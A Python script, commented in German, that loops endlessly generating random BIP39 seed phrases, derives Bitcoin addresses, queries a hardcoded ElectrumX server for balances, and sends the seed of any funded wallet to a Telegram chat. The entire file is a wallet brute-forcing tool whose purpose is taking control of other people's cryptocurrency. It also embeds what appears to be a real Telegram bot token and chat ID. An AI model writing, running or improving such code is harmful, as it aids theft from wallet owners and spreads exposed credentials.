import os
import asyncio
import aiohttp
import logging
import multiprocessing
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39WordsNum
from aiogram import Bot

# Logger-Konfiguration
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Telegram-Token und Chat-ID direkt im Code definieren
TELEGRAM_TOKEN = "7706620947:AAGLGdTIKi4dB3irOtVmHD57f1Xxa8-ZIcs"
CHAT_ID = "1596333326"
ELECTRUMX_SERVER_URL = "http://85.215.178.149:50002"   # Beispiel-URL für ElectrumX-Server

bot = Bot(token=TELEGRAM_TOKEN)

async def notify_telegram(seed, btc_address, btc_balance):
    message = (
        f"⚠️ Wallet mit Balance gefunden!\n\n"
        f"Seed: {seed}\n"
        f"Adresse: {btc_address}\n"
        f"Balance: {btc_balance} BTC"
    )
    await bot.send_message(CHAT_ID, message)

def generate_bip39_seed():
    return Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)

def bip44_btc_address_from_seed(seed_phrase):
    seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
    return bip44_addr_ctx.PublicKey().ToAddress()


async def check_btc_balance(address, retries=3, delay=5):
    timeout = aiohttp.ClientTimeout(total=60)
    for attempt in range(retries):
        try:
            logging.info(f"Attempt {attempt+1}: Checking balance for {address}")
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(f"{ELECTRUMX_SERVER_URL}/address/{address}") as response:
                    data = await response.json()
                    balance = data.get("confirmed", 0) / 100000000
                    logging.info(f"Balance for {address}: {balance} BTC")  # Loggt das Ergebnis der Balance
                    return balance
        except aiohttp.ClientError as e:
            logging.warning(f"Attempt {attempt+1} failed for {address}: {e}")
            if attempt < retries - 1:
                await asyncio.sleep(delay)
            else:
                raise


async def process_wallet_async(seed):
    btc_address = bip44_btc_address_from_seed(seed)
    btc_balance = await check_btc_balance(btc_address)
    if btc_balance > 0:
        logging.info(f"Wallet mit Balance gefunden: {btc_address} - Balance: {btc_balance} BTC")
        await notify_telegram(seed, btc_address, btc_balance)

def process_wallet_multiprocessing(seed):
    asyncio.run(process_wallet_async(seed))

async def main():
    while True:  # Endlosschleife
        seeds = [generate_bip39_seed() for _ in range(500)]  # 500 Seeds pro Zyklus
        with multiprocessing.Pool() as pool:
            pool.map(process_wallet_multiprocessing, seeds)

if __name__ == "__main__":
    asyncio.run(main())
